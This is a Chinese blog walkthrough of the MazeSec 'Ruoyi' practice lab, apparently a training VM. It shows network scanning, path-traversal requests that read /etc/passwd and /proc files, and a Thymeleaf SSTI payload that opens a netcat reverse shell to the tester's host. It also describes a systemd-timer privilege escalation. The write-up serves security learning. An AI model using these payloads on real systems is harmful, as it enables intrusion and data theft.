@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec Ruoyi</title>
+        <meta name="description" content="靶机信息 名称：Ruoyi 作者：场_room 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：RuoYi v4.5.0 路径遍历、Thymeleaf SSTI、systemd定时任务提权、Linux提权 摘要：本文记录了…">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-ruoyi/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec Ruoyi">
+    <meta property="og:description" content="靶机信息 名称：Ruoyi 作者：场_room 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：RuoYi v4.5.0 路径遍历、Thymeleaf SSTI、systemd定时任务提权、Linux提权 摘要：本文记录了…">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-ruoyi/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-ruoyi/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec Ruoyi">
+    <meta name="twitter:description" content="靶机信息 名称：Ruoyi 作者：场_room 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：RuoYi v4.5.0 路径遍历、Thymeleaf SSTI、systemd定时任务提权、Linux提权 摘要：本文记录了…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-ruoyi/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Ruoyi</h1>
+    <p>
+        <span class="meta">发布于: 2026-04-02 00:23</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>名称：Ruoyi<br>
+作者：场_room<br>
+系统：Linux<br>
+难度：Easy<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p><strong>关键词</strong>：RuoYi v4.5.0 路径遍历、Thymeleaf SSTI、systemd定时任务提权、Linux提权</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec Ruoyi 靶机的渗透过程。通过识别目标运行的 RuoYi v4.5.0 框架，利用页面源码中暴露的注册接口 /r3g1ster 注册低权限用户；随后利用该版本 CommonController 中 /common/download/resource 接口未对 resource 参数做路径限制的缺陷（CNVD-2021-01931 类路径遍历），读取 /etc/passwd、/proc/self/cmdline、Tomcat 配置等敏感信息，确认 Java 11 + Tomcat 运行环境及 fortonight 用户；接着利用 Thymeleaf 组件 SSTI 漏洞，向 /demo/form/localrefresh/task 接口的 fragment 参数注入 ${T(java.lang.Runtime)...} 表达式，成功反弹 Shell 获取 fortonight 权限；提权阶段发现当前用户所属的 ops 组对 root 定时执行的 ops-report.service 所调用的 Python 插件 netmon.py 具有写权限，篡改 collect() 函数植入反弹 Shell，等待 systemd 定时器触发后以 root 权限回调，完成权限提升。该靶机重点考察了 Java Web 框架历史 CVE 的精准定位与 Linux 组权限配合 systemd 定时服务的提权思路。</p>
+<h2>信息收集</h2>
+<h3>存活主机扫描</h3>
+<p>arp-scan 扫描，靶机 IP 地址为 192.168.6.220</p>
+<pre><code class="language-bash">arp-scan 192.168.6.0/24 
+
+192.168.6.220   08:00:27:cf:ef:85       PCS Systemtechnik GmbH</code></pre>
+<p>依次为 IP 地址、MAC 地址和厂商信息（根据 MAC 地址的前 3 个字节（OUI，组织唯一标识符）08:00:27 从 IEEE 注册的 OUI 数据库中查到的制造商名称。）</p>
+<div class="callout callout-tip">
+<p>MAC地址识别： 当你在虚拟化环境中看到 MAC 地址以 08:00:27 开头并标注为 "PCS Systemtechnik GmbH" 时，这表示该设备是一台由 VirtualBox 托管的虚拟机。<br>
+特定厂商标识： 虽然 VirtualBox 网卡由 Oracle 拥有，但其注册在该公司（PCS Systemtechnik）名下，因此在arp表中显示该名字。   </p>
+</div>
+<h3>端口扫描</h3>
+<p>nmap 扫描</p>
+<ul>
+<li>-p- 扫描所有端口</li>
+<li>-sS 使用 SYN 扫描,也称为半开放扫描，速度较快</li>
+<li>-n 不进行 DNS 解析，直接使用 IP 地址，提高扫描速度</li>
+</ul>
+<pre><code class="language-bash">nmap 192.168.6.220 -p- -sS -n
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+<p>靶机开放了 22 和 80 端口</p>
+<h3>80 端口信息收集</h3>
+<p>访问 web 页面，一个 Ruoyi 的登录界面，尝试使用默认账号 admin/admin123 登录失败</p>
+<p><img src="/images/maze-ruoyi/1.png" alt="" decoding="async" width="1920" height="955"></p>
+<p>查看 html 源码，发现注册接口  /r3g1ster </p>
+<p><img src="/images/maze-ruoyi/2.png" alt="" decoding="async" loading="lazy" width="1528" height="953"></p>
+<p>可以注册用户，注册一个 admin/admin</p>
+<p><img src="/images/maze-ruoyi/3.png" alt="" decoding="async" loading="lazy" width="928" height="559"></p>
+<p>登录后，显然是一个 guest 权限用户，不过，获取到关键信息，Ruoyi 版本 v4.5.0</p>
+<p><img src="/images/maze-ruoyi/4.png" alt="" decoding="async" loading="lazy" width="1920" height="950"></p>
+<h2>Ruoyi 漏洞利用</h2>
+<p>找到 Ruoyi 的版本信息后，搜索 Ruoyi v4.5.0 的漏洞，找到一些漏洞，如任意文件读取、SSTI 注入RCE等</p>
+<p>参考链接：</p>
+<ol>
+<li>
+<p>RuoYi框架部分历史漏洞 <a href="https://www.cnblogs.com/carmi/p/18402581">https://www.cnblogs.com/carmi/p/18402581</a></p>
+</li>
+<li>
+<p>若依4.5版本代码漏洞分析 <a href="https://blog.csdn.net/sunyufei_666/article/details/142335534">https://blog.csdn.net/sunyufei_666/article/details/142335534</a></p>
+</li>
+</ol>
+<h3>任意文件读取</h3>
+<p>通过文章 1 中的漏洞分析，发现 Ruoyi v4.5.0 存在一个任意文件读取漏洞，攻击者可以通过构造恶意请求来读取服务器上的任意文件</p>
+<p>复现任意文件读取漏洞，构造如下请求：</p>
+<pre><code class="language-plaintext">http://192.168.6.220/common/download/resource?resource=/profile/../../../../../../etc/passwd</code></pre>
+<p><img src="/images/maze-ruoyi/5.png" alt="" decoding="async" loading="lazy" width="1672" height="776"></p>
+<p>可以发现存在靶机存在用户 fortonight 用户</p>
+<p><img src="/images/maze-ruoyi/6.png" alt="" decoding="async" loading="lazy" width="948" height="601"></p>
+<p>可以通过任意文件读取，读取 user flag</p>
+<pre><code class="language-plaintext">http://192.168.6.220/common/download/resource?resource=/profile/../../../../../../home/fortonight/user.txt</code></pre>
+<p>通过 <code>/proc</code> 目录下的文件，可以获取到当前进程相关信息，如环境变量、启动命令等</p>
+<pre><code class="language-plaintext">http://192.168.6.220/common/download/resource?resource=/profile/../../../../../../proc/self/environ
+http://192.168.6.220/common/download/resource?resource=/profile/../../../../../../proc/self/cmdline</code></pre>
+<p>cmdline 信息：</p>
+<pre><code class="language-bash">/usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start </code></pre>
+<p>可以发现靶机使用了 Tomcat 服务器，Java 版本为 Java 11，项目目录为 /opt/tomcat/，可以通过任意文件读取，读取项目目录下的文件，如 /opt/tomcat/webapps/ROOT/WEB-INF/classes/application.yml 项目配置文件</p>
+<p><img src="/images/maze-ruoyi/7.png" alt="" decoding="async" loading="lazy" width="1528" height="675"></p>
+<p>可以拿到 shiro key，尝试利用 shiro 反序列化漏洞，没有成功。</p>
+<h3>未授权SSTI RCE</h3>
+<p>通过文章 2 中的漏洞分析，发现 Ruoyi v4.5.0 存在一个 SSTI 注入漏洞，攻击者可以通过构造恶意请求来执行服务器上的任意命令</p>
+<p>复现 SSTI 注入漏洞，构造如下 POST 请求：</p>
+<pre><code class="language-plaintext">http://192.168.6.220/demo/form/localrefresh/task
+
+fragment=${T(java.lang.Runtime).getRuntime().exec("busybox+nc+192.168.6.111+4444+-e+bash")}</code></pre>
+<p>可以发现存在 SSTI 注入漏洞，成功执行了命令，获得了反弹 shell</p>
+<p><img src="/images/maze-ruoyi/8.png" alt="" decoding="async" loading="lazy" width="745" height="492"></p>
+<p>至此，拿到了 fortonight 权限 shell</p>
+<h2>权限提升</h2>
+<p>尝试信息收集，当前用户没有无密码 sudo 权限，靶机无可直接利用 的 SUID 程序</p>
+<p>尝试收集靶机新建文件、可写文件等</p>
+<pre><code class="language-bash"># 查找最近 7 天内创建的文件，排除掉一些系统目录和日志目录
+find / -type f -ctime -7 2&gt;/dev/null | grep -Ev '^(/proc|/sys|/run|/opt/tomcat|/opt/RuoYi|/var/log)' | xargs ls -laht
+# 查找当前用户可写的文件
+find / -type f -writable 2&gt;/dev/null | grep -Ev '^(/proc|/run|/sys|/opt/tomcat)' | xargs ls -alht</code></pre>
+<p>可以找到靶机作者创建的服务文件</p>
+<pre><code class="language-plaintext">/etc/systemd/system/ops-report.timer
+/etc/systemd/system/ops-report.service
+/etc/systemd/system/tomcat.service</code></pre>
+<p><img src="/images/maze-ruoyi/9.png" alt="" decoding="async" loading="lazy" width="1474" height="932"></p>
+<p>找到某个 root 用户 和 ops 组可写文件，且当前用户属于 ops 组，具有修改该文件的权限</p>
+<p><img src="/images/maze-ruoyi/10.png" alt="" decoding="async" loading="lazy" width="1183" height="277"></p>
+<p>其中，ops-report 成对出现的 timer 和 service 文件，猜测是一个定时执行的服务，查看 ops-report.service、ops-report.timer 文件内容</p>
+<pre><code class="language-plaintext">[Timer]
+OnBootSec=2min          # 开机后 2 分钟首次执行
+OnUnitActiveSec=1min    # 之后每隔 1 分钟执行一次
+Unit=ops-report.service
+
+[Service]
+User=root               # ⚠️ 以 root 身份执行！
+ExecStart=/usr/bin/python3 /opt/opsagent/reporter.py</code></pre>
+<p><img src="/images/maze-ruoyi/11.png" alt="" decoding="async" loading="lazy" width="925" height="514"></p>
+<p>ops-report 服务以 root 身份运行，且每分钟执行一次 /opt/opsagent/reporter.py 文件，reporter.py 会动态加载 plugins/netmon.py，并执行 netmon.py 中的 collect() 函数</p>
+<p><img src="/images/maze-ruoyi/12.png" alt="" decoding="async" loading="lazy" width="1055" height="868"></p>
+<p>可以修改 netmon.py 文件，在 collect() 函数中添加反弹 shell 代码</p>
+<p><img src="/images/maze-ruoyi/13.png" alt="" decoding="async" loading="lazy" width="1129" height="485"></p>    </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
